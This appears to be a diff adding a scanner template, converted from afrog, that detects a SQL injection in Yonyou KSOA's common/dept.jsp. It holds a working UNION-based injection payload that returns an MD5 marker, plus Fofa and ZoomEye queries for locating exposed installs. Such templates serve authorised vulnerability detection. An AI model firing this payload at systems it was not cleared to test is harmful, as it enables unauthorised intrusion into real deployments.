@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0x827ccb0eea8a706"
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/common/dept.jsp?deptid=1'' UNION ALL SELECT 60%2Csys.fn_sqlvarbasetostr(HASHBYTES(''MD5''%2C''12345''))--+'
+id: yonyou-ksoa-dept-sqli
+info:
+  author: zan8in
+  description: |-
+    Fofa: app="用友-时空KSOA"
+    ZoomEye: app:"用友时空KSOA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 用友时空 KSOA common/dept.jsp SQL 注入漏洞
+  severity: high
+  tags: yonyou,ksoa,sqli,argus-import
